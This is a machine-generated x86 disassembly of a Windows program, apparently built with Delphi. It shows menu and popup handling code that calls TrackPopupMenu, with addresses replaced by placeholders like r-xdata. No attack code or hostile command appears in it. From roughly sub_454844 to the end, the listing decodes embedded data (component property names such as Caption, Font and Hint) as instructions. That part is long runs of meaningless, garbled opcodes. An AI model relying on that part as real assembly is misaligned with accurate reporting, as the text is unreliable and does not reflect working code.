mov eax [ rw-data ]
call sub_454368
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_454420
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_454390
mov edx ebx
and dl 0xfc
mov eax esi
call sub_452fc8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_454478
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x41 ] 0x0
je r-xdata
lea eax [ ebx + 0x58 ]
call sub_44f2c4
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov dl [ eax + 0x34 ]
mov eax ebx
call sub_453c34
mov [ ebx + 0x41 ] 0x1
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_453c34
mov [ ebx + 0x41 ] 0x1
jmp r-xdata
sub_4544c0
push esi
xor edx edx
mov ecx [ rw-data ]
cmp [ ecx + 0xd ] 0x0
je r-xdata
mov eax edx
pop esi
retn
cmp [ eax + 0x41 ] 0x0
je r-xdata
cmp [ eax + 0x30 ] 0x1
sete dl
add eax 0x58
call sub_44f2c4
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45f458
mov edx eax
jmp r-xdata
mov si 0xffc8
call sub_403368
mov edx eax
jmp r-xdata
sub_45450c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov ecx esp
mov edx edi
mov eax esi
call sub_416a38
mov eax [ esp ]
mov [ ebx + 0x58 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x5c ] eax
mov eax ebx
call sub_454478
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_452880
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_452d7c
mov eax [ ebx + 0x34 ]
call sub_450124
mov eax ebx
call sub_453724
mov eax ebx
call sub_4544c0
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 2 + rw-data ]
xor edx edx
mov dl [ ebx + 0x60 ]
mov bp [ eax + edx * 2 ]
xor eax eax
mov al [ ebx + 0x68 ]
or bp [ eax * 2 + rw-data ]
movzx ebp bp
xor eax eax
mov al [ ebx + 0x69 ]
shl eax 0xa
or ebp eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
push eax
push 0x0
push edi
push esi
push ebp
mov eax [ ebx + 0x34 ]
call sub_450254
push eax
call TrackPopupMenu
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4545c0
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_417e94
xor edx edx
mov [ eax ] edx
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_417e94
cmp ebp [ eax ]
jne r-xdata
sub_4545fc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x15 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov bl 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jg r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_4221f8
mov edx 0xff000007
mov eax [ edi + 0xc ]
call sub_421a0c
test [ ebp + 0x8 ] 0x80
je r-xdata
mov edx 0xff00000d
mov eax [ edi + 0x14 ]
call sub_4221f8
mov edx 0xff00000e
mov eax [ edi + 0xc ]
call sub_421a0c
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xfff2
call sub_403368
mov edx [ r-xdata ]
call sub_4032f8
mov [ ebp - 0x5 ] al
test [ ebp + 0x8 ] 0x1
je r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_4221f8
mov edx 0xff000011
mov eax [ edi + 0xc ]
call sub_421a0c
jmp r-xdata
mov ax [ ebp + 0x8 ]
push eax
mov al [ ebp - 0x5 ]
push eax
lea ecx [ ebp - 0x15 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test bl bl
jne r-xdata
sub_4546e4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_403f94
mov ebx 0x1
jmp r-xdata
mov eax [ esi ]
call sub_404200
cmp ebx eax
jle r-xdata
mov eax [ esi ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
mov ecx eax
and ecx 0xff
bt [ edx ] ecx
jae r-xdata
pop esi
pop ebx
retn
cmp al 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax esi
mov ecx 0x1
mov edx ebx
call sub_4044a0
cmp ebx 0x1
jle r-xdata
mov eax [ esi ]
call sub_404200
sub eax ebx
cmp eax 0x2
jl r-xdata
mov eax [ esi ]
cmp [ eax + ebx - 0x2 ] 0x28
jne r-xdata
mov eax [ esi ]
cmp [ eax + ebx + 0x1 ] 0x29
jne r-xdata
mov edx ebx
dec edx
mov eax esi
mov ecx 0x4
call sub_4044a0
jmp r-xdata
sub_454778
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax ebp
call sub_403f40
mov ebx 0x1
mov eax esi
call sub_404200
mov edi eax
cmp edi ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
cmp [ esi + ebx - 0x1 ] 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
cmp edi ebx
jge r-xdata
mov eax edi
sub eax ebx
dec eax
jl r-xdata
inc ebx
cmp [ esi + ebx - 0x1 ] 0x26
je r-xdata
mov eax ebp
mov dl [ esi + ebx - 0x1 ]
call sub_404128
sub_4547dc
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_454835
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4546e4
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_4546e4
mov eax [ ebp - 0x8 ]
pop edx
call sub_4080e8
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45483c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f64
retn
sub_454844
adc al [ eax ]
add [ eax ] al
dec eax
jge r-xdata
add al dh
mov cl [ eax ]
and [ ebp + 0x48 ] bh
add al bl
xchg [ eax ] cl
sbb al 0x7d
dec eax
add [ esi + eax * 4 + 0x48 ] ch
add [ ebp + edi * 2 + 0x48 ] al
add ah ch
test [ eax ] ecx
inc eax
jge r-xdata
fwait
dec eax
add al ch
jno r-xdata
add [ eax - 0x76 ] cl
dec eax
add [ edi * 2 - 0x74a3ffb8 ] dl
dec eax
add [ eax + 0x1800488a ] cl
jge r-xdata
add [ eax - 0x7b ] dh
dec eax
add [ edi * 2 - 0x7a43ffb8 ] bh
dec eax
add [ eax ] bh
jge r-xdata
inc ebp
add [ edi + edi * 8 + 0x30 ] ah
cli
jmp [ ecx + rw-data ]
cli
jmp [ ecx + rw-data ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
add [ eax ] bl
mov ecx [ eax ]
or al 0x7d
dec eax
add [ eax ] dl
jge r-xdata
add [ ebx + ecx * 4 + 0x48 ] bl
add [ eax - 0x76 ] al
dec eax
add [ edi * 2 - 0x7a3bffb8 ] dh
dec eax
add [ eax ] dh
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
retn
mov eax [ rw-data ]
call sub_40316c
mov eax [ rw-data ]
call sub_40316c
mov eax [ rw-data ]
call sub_40316c
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_4049c8
mov eax rw-data
call sub_403f40
add ah ch
xchg [ eax ] cl
or [ ebp + 0x48 ] bh
add [ edi + eax * 4 ] al
dec eax
add [ edi * 2 - 0x788fffb8 ] al
add [ eax ] dl
mov [ eax ] cl
sub al 0x7d
dec eax
add [ edi + eax * 4 + 0x48 ] al
add [ eax ] ch
jge r-xdata
dec eax
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
add [ eax - 0x79 ] dh
add ah dh
mov cl [ eax ]
and al 0x7d
dec eax
sub_454af5
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax + eax ] 0x0
inc [ ecx ]
add [ 0x6f6c6f43 ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
or al [ edx + 0x75 ]
je r-xdata
dec ecx
inc ebp
add [ eax ] cl
add [ eax ] al
dec [ eax ]
add [ eax ] al
jmp [ eax + 0x4576 ]
jge r-xdata
outsd
outsb
push ebx
imul edi [ edx + 0x65 ] r-xdata
sub [ eax ] al
add bh bh
int3
call [ eax + 0x7f ]
inc ebp
add [ edi + edi * 2 + 0x45 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push es
add [ 0x676e6152 ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
add [ eax ] al
[ 0x1ff0000 ]
cmp al 0x10
inc eax
add [ eax ] dh
add [ eax ] al
inc esp
jle r-xdata
push ebx
insd
outsd
outsd
je r-xdata
outsb
je r-xdata
in al dx
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x8d656c62
inc eax
add [ eax + 0x300454c ] cl
or al 0x54
push edi
imul ebp [ esi + 0x64 ] 0x7453776f
popad
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al [ eax ]
or [ eax + ebp * 2 + 0x75 ] edx
insd
bound edx [ ebx + 0x69 ]
jpe r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
add al 0x53
imul edi [ edx + 0x65 ] r-xdata
xor al 0x0
add bh bh
or [ edi + 0x45 ] bh
inc eax
add [ edi ] bl
add [ eax ] al
[ edi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ esi ] al
popad
outsb
add [ gs : bx + si ] dl
outsd
insb
outsd
jb r-xdata
outsb
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
add al ah
pushad
inc esp
add al dl
arpl [ eax + eax - 0x40 ] ax
add [ ebp ] 0x70
test [ ebp ] eax
movsb [ edi ] [ esi ]
xchg [ ebp ] eax
push es
add [ 0x15011400 ] al
add [ eax + esi * 4 ] edi
in al dx
inc eax
[ eax - 0x7bffba79 ]
add al al
xor eax [ eax ]
pushfd
out 0x41 eax
add al cl
xor eax [ eax ]
inc esp
aas
inc esp
add [ ecx + esi ] al
inc eax
add [ eax ] ah
xor [ eax ] eax
adc al 0x82
inc ebp
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ esp + ecx * 2 + 0x77080045 ] al
jae r-xdata
inc ebp
add [ eax ] cl
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] dl
inc eax
add [ 0x1dff0000 ] bl
add [ eax ] al
inc [ ecx ]
add [ gs : eax ] dl
add eax 0x676e6152
adc [ eax ] al
or al 0x0
add bh bh
add [ esi + 0x45 ] bh
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x6f500800
jae r-xdata
jb r-xdata
outsd
insb
sbb [ ebp + 0x45 ] cl
add al dh
mov esp 0xd0043
add eax 0x6d726f46
inc ecx
mov ecx 0xee480043
outsd
jb r-xdata
inc esp
add [ edi + esi ] cl
inc esp
add [ eax - 0x5fffbe7c ] ch
sbb al 0x44
add [ eax - 0x3fffbc10 ] al
outsd
dec esi
add [ eax ] al
je r-xdata
jb r-xdata
je r-xdata
dec edx
inc ebp
add [ eax ] cl
add al [ eax ]
[ eax - 0x7c ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x480d000b ] al
outsd
jb r-xdata
add [ edx + ecx * 2 + 0x2080045 ] bl
add bh bh
pop eax
test [ ebp ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax [ eax ]
or eax 0x7a726f48
add [ edi + ebp * 2 ] ah
popad
insb
or esi [ edi + 0x73 ]
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
or esi [ fs : edi + 0x73 ]
dec ebp
popad
js r-xdata
or eax [ eax ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
add eax 0x6c797453
cmp al 0x10
inc eax
add [ eax ] bh
add [ eax ] al
jmp [ eax ]
dec [ eax ]
jg r-xdata
outsd
outsb
cmp al 0x10
inc eax
add [ eax ] dl
add [ eax ] al
and [ ecx ] dh
inc eax
jae r-xdata
lea eax [ eax ]
or [ edi + 0x45 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
jae r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
insb
imul ebp [ esi + 0x67 ] 0x436e6957
outsd
outsb
je r-xdata
dec edx
inc ebp
add [ edx + eax ] cl
add bh bh
push 0x1004584
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x560d000c ] al
and eax [ eax + eax - 0x68 ]
stc
inc ebx
add [ eax - 0x12 ] ah
xor al 0x43
add al al
insd
imul edi [ edx + 0x65 ] 0x6f460564
jb r-xdata
add [ eax ] ch
dec esi
inc ebp
add [ eax + eax + 0x5 ] al
inc esi
outsd
jb r-xdata
add al ah
pushad
inc esp
add al dl
arpl [ eax + eax - 0x40 ] ax
add [ ebp ] 0x70
test [ ebp ] eax
movsb [ edi ] [ esi ]
xchg [ ebp ] eax
add al [ eax ]
test [ eax ] al
adc [ eax + sub_458a90 ] dh
cwde
mov al [ ebp ]
or dl [ ebx + edx * 2 + 0x63 ]
jb r-xdata
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ esi + ecx * 2 + 0x46050045 ] ah
outsd
dec edi
inc ebp
inc ecx
add [ eax - 0x15 ] cl
inc ecx
add [ eax - 0x15 ] al
inc ecx
add [ eax - 0x12 ] ch
inc ecx
add ah cl
mov [ ebp ] eax
cmp [ edx + 0x44 ] ch
add [ edi + ebp * 2 + 0x44 ] dl
add [ eax - 0xbffbb92 ] ah
out dx al
inc ebx
add al bh
inc esp
add [ eax ] bl
inc esp
add [ eax ] dh
bound eax [ eax + eax + 0x3c ]
out dx al
inc ebx
add [ eax - 0x12 ] al
inc ebx
add [ eax + 0x1e ] dh
inc esp
add [ esi + ebx - 0x67fffbc ] bl
inc ebx
add [ eax + 0xc0043ef ] bh
sti
inc ebx
add [ edx + edi * 8 - 0x267ffbd ] al
inc ebx
add [ esp + edi * 8 + 0x43 ] al
add al ah
cmp eax 0x1f200044
inc esp
inc esp
add [ eax + 0x600043f9 ] bl
inc ebp
jb r-xdata
imul edi [ edx + 0x65 ] 0x656c6261
or [ edx + 0x73 ] ah
inc esp
imul esp [ ecx + 0x6c ] 0x620c676f
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edx * 2 + 0x45 ] dh
outsd
outsd
insb
push edi
imul ebp [ esi + 0x64 ] 0x620d776f
jae r-xdata
jb r-xdata
push esi
outsd
insb
nop
sub al 0x4e
inc ebp
add [ edi ] al
adc al 0x54
push ebx
arpl [ edx + 0x6f ] si
insb
insb
imul ebp [ esi + 0x67 ] 0x436e6957
outsd
outsb
je r-xdata
add [ ebx ] al
or al 0x54
inc edx
outsd
jb r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
inc ecx
add [ eax - 0x15 ] cl
inc ecx
add [ eax - 0x15 ] al
inc ecx
add [ eax - 0x12 ] ch
inc ecx
add [ ecx + eax * 4 + 0x6a380045 ] bl
inc esp
add [ edi + ebp * 2 + 0x44 ] dl
add [ eax - 0xbffbb92 ] ah
out dx al
inc ebx
add al bh
inc esp
add [ eax ] bl
inc esp
add [ eax ] dh
bound eax [ eax + eax + 0x3c ]
out dx al
inc ebx
add [ eax - 0x12 ] al
inc ebx
add [ eax + 0x1e ] dh
inc esp
add [ esi + ebx - 0x67fffbc ] bl
inc ebx
add [ eax + 0xc0043ef ] bh
sti
inc ebx
add [ edx + edi * 8 - 0x267ffbd ] al
inc ebx
add [ esp + edi * 8 + 0x43 ] al
add al ah
cmp eax 0x1f200044
inc esp
add [ edx + 0x63400044 ] al
inc esp
add [ esi + ebx * 2 ] bh
inc esp
add [ ebx ] ah
inc esp
add ah cl
mov [ ebp ] al
mov al [ 0x6c004582 ]
cmp [ eax + eax + 0x50 ] al
add [ ebp ] 0x54
xor eax 0x82600044
inc ebp
add [ ecx + edi ] al
inc esp
add [ eax ] cl
cmp [ eax + eax - 0x40 ] eax
aaa
inc esp
add [ eax + 0x37 ] ch
inc esp
add [ esp + 0x44 ] ah
add [ eax + 0x14004441 ] dh
jbe r-xdata
jae r-xdata
add [ eax + eax ] bl
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or [ ecx + 0x75 ] al
je r-xdata
jae r-xdata
add [ eax ] dl
add al [ eax ]
[ esp + eax * 4 ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
insb
insb
inc edx
outsd
js r-xdata
out dx al
jae r-xdata
add [ edx + eax * 4 ] dl
jb r-xdata
add [ eax + edx * 2 + 0x45 ] dl
add [ edx + 0x50 ] ah
inc ebp
add [ edx + eax ] ah
add [ eax ] al
int3
imul edi [ edx + 0x65 ] 0x6c6f6f54
push edi
imul ebp [ esi + 0x5 ] 0x6d726f46
inc esi
outsd
jb r-xdata
dec esi
inc ebp
add [ ebx ] al
adc [ esi + eax * 2 + 0x6f ] dl
jb r-xdata
or [ edx + esi * 2 + 0x61 ] dl
arpl [ ebx + 0x69 ] bp
outsb
add [ bx + si ] dl
inc eax
add [ eax + eax ] bl
add bh bh
jo r-xdata
dec ebp
inc ebp
add [ edx ] dl
dec esi
inc ebp
add [ edx + eax ] bl
add [ eax ] al
cmp al 0xb9
inc ebx
add [ eax - 0x12 ] cl
rcr [ eax ] 0x4d
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ecx * 2 ] ch
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
jne r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
bound eax [ ecx ]
add bh bh
jno r-xdata
add [ eax ] al
push cs
add [ edi ] al
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ eax - 0x5e ] cl
inc ebx
add [ ebx ] bl
add bh bh
add al 0xb8
inc ebx
add [ ecx + eax ] ah
outsd
push ebx
arpl [ edx + 0x6f ] si
insb
insb
add [ eax ] dl
inc eax
add [ edx + 0x63400044 ] al
inc esp
add [ esi + ebx * 2 ] bh
inc eax
add [ eax + edx * 2 + 0x45 ] dh
add [ edi ] al
or dl [ ebx + edx * 2 + 0x63 ]
jb r-xdata
dec esi
inc ebp
add [ esi ] al
bound esi [ ebx + 0x4e ]
outsd
outsb
or [ gs : edx + 0x73 ] ah
push ebx
imul ebp [ esi + 0x67 ] 0x620a656c
jae r-xdata
add eax 0xa4000000
inc eax
add [ eax + 0x454f ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
add [ edi + ebp * 2 ] ah
inc esp
add [ edi + esi ] cl
inc esp
add [ eax - 0x5fffbe7c ] ch
sbb al 0x44
add [ eax - 0x3fffbc10 ] al
xor eax [ eax ]
inc esp
aas
inc esp
add [ ecx + esi ] al
inc eax
add [ eax ] ah
xor [ eax ] eax
adc al 0x82
je r-xdata
add [ 0xffffffffa4000000 ] al
jae r-xdata
insb
inc edx
outsd
jb r-xdata
add bh bh
jl r-xdata
jb r-xdata
jmp [ eax ]
add [ eax ] eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add [ eax ] al
add bh bh
and [ ecx + 0x44 ] dh
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edx ] dl
add [ edx ] cl
inc edx
jbe r-xdata
add [ eax ] dl
inc eax
add [ eax ] al
str [ edx ]
inc ecx
jne r-xdata
insb
insb
inc edx
outsd
js r-xdata
and eax [ eax + eax - 0x68 ]
stc
inc ebx
add [ eax - 0x12 ] ah
jb r-xdata
test al 0xb8
inc ebx
add [ ebp + 0x1 ] ah
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc [ eax ] eax
or al [ edx + 0x65 ]
jbe r-xdata
add bh bh
xchg esp eax
jno r-xdata
mov eax 0x1650043
add [ eax ] al
add [ eax + eax ] dl
insb
inc ebp
jae r-xdata
add [ eax ] al
adc eax 0x65420a00
jbe r-xdata
insb
dec ecx
outsb
outsb
jb r-xdata
inc esp
add [ ebx ] ah
inc esp
add ah cl
mov [ ebp ] al
mov al [ 0x6c004582 ]
cmp [ eax + eax + 0x2c ] al
mov al [ ebp ]
push esp
xor eax 0x82600044
inc ebp
add [ ecx + edi ] al
inc esp
add [ eax ] cl
cmp [ eax + eax - 0x40 ] eax
aaa
inc esp
add [ eax + 0x37 ] ch
inc esp
add [ esp + 0x44 ] ah
add [ eax + 0x14004441 ] dh
jbe r-xdata
arpl [ eax + eax + 0x3c ] ax
pop esi
dec edi
inc ebp
add bh bh
jo r-xdata
or [ edx + 0x65 ] eax
jbe r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
hlt
jb r-xdata
pop ss
add [ ebx ] cl
inc edx
outsd
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
push 0xb4ff0001
jno r-xdata
add [ eax ] eax
jmp [ eax ]
mov eax 0x1630043
add [ eax + 0x430b0018 ] al
outsd
outsb
jae r-xdata
insb
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
mov eax 0x1640043
add bh bh
and [ ecx + 0x44 ] dh
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx ] dl
add [ edx ] cl
inc edx
jbe r-xdata
add dh bh
aam 0xfc
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add bh bh
jpe r-xdata
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
inc [ eax ]
sbb al 0x44
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
je r-xdata
jb r-xdata
add [ eax + 0x42080016 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xc65646f
dec edi
inc ebp
add [ eax ] ah
add al [ eax ]
insb
dec edi
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb al [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
insb
sbb [ gs : edx + 0x740043 ] ch
add bh bh
mov eax 0x1004420
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
je r-xdata
inc ecx
add [ eax ] dh
add [ eax ] al
add [ ebx ] bl
add [ eax ] cl
inc esp
jb r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ eax + 0x2cff0001 ] ch
push eax
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb [ eax ] eax
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
xor [ gs : edx + 0x7a0043 ] ah
inc ebx
add [ ebp + edi * 8 + 0x43 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305001e ] al
outsd
insb
outsd
call [ eax - 0x3 ]
jae r-xdata
adc [ eax ] al
movsd [ edi ] [ esi ]
add [ eax ] eax
call [ eax - 0x4bffbb9b ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305001f ] al
je r-xdata
jb r-xdata
sbb [ esi ] 0x0
add eax 0x6f6c6f43
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
add bh bh
push eax
std
jb r-xdata
popad
arpl [ ebx + 0x67 ] bp
jb r-xdata
xor eax [ esp + edx + 0x2 ]
inc edx
add [ eax ] ch
add bh bh
movsb [ edi ] [ esi ]
cld
inc ebx
add [ esp + edi * 8 + 0x43 ] dh
add [ eax - 0x80000000 ] al
and [ eax ] al
add al 0x46
outsd
outsb
je r-xdata
add [ eax ] al
add [ ecx ] bl
add [ eax ] cl
inc esp
outsd
arpl [ ebx + 0x53 ] bp
imul esi [ ebp + 0x30 ] 0x7a0043a2
add [ eax ] al
test al 0x43
add [ ebx - 0x64010000 ] bl
je r-xdata
jne r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
inc esi
add [ fs : eax ] dl
inc eax
add [ edx ] bl
add bh bh
je r-xdata
sar dl 0x1
jo r-xdata
adc [ eax ] al
0x24ff0000 0x43fd
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push [ ebp + edi * 8 + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and eax [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
inc ebx
sub [ edi ] 0x0
push cs
jpe r-xdata
movsb [ edi ] [ esi ]
add [ eax ] eax
inc [ esi + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
outsb
jne r-xdata
outsb
je r-xdata
add [ ecx ] 0x0
add [ eax ] al
add [ es : esi ] cl
outsb
je r-xdata
add [ eax ] al
js r-xdata
add [ eax ] al
mov esp 0x20004152
add [ eax ] eax
jmp [ eax ]
inc ebx
add [ eax + 0x1c ] ah
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub eax [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] r--data
mov al 0x43
add al al
add [ eax ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002c ] al
outsb
inc ebx
popad
outsb
push edx
jae r-xdata
adc [ eax ] al
push edi
add [ eax ] al
call eax
cli
adc [ eax ] al
cdq
add [ eax ] al
inc [ eax ]
std
inc ebx
add al cl
cld
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080028 ] al
push 0x6948776f
outsb
je r-xdata
inc esp
